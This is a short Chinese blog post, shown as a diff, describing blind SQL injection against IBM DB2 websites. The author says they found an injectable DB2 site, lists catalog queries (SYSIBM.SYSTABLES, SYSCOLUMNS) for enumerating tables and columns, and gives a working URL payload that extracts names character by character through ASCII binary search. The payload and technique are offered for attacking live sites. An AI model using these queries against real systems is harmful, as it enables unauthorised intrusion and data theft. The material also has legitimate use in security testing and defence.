@@ -1,0 +1,16 @@
+使用DB2的人比较少了，今天碰到了一个可供注入的DB2网站，想试试身手。不过在网上很难找到相关的资料，只好自己研究了。 
+参考了IBM DB2的文档，总结了这样几条： 
+1、select NAME from SYSIBM.SYSTABLES where CREATOR =USER 
+可以返回系统中所有用户创建的表（table）名 
+2、select NAME from SYSIBM.SYSCOLUMNS where TBCREATOR = '' and TBNAME='' 
+返回表中的列名 
+3、select NAME from SYSIBM.SYSTABLES where CREATOR =USER FETCH FIRST 1 ROWS ONLY 
+这是最关键的地方，返回第一条记录，类似于sql server中的top 1 
+4、SUBSTR(string, position, length) 
+返回字符串子串的函数，类似于mid 
+5、ASCII()这个就不用多说了。 
+有了这些语句和函数，我们就可以很方便的用ascii拆半法猜出所有的table名，字段名，以及其中的数据了。 
+例如判断第一个table的名称的第一个字符的ascii码是否大于50： 
+http://*.com?test.jsp?id=1 and (select ASCII(SUBSTR(NAME,1,1)) from SYSIBM.SYSTABLES where CREATOR =USER FETCH FIRST 1 ROWS ONLY)>50 -- 
+
+http://blog.waynedeng.com/blogview.asp?logID=543 
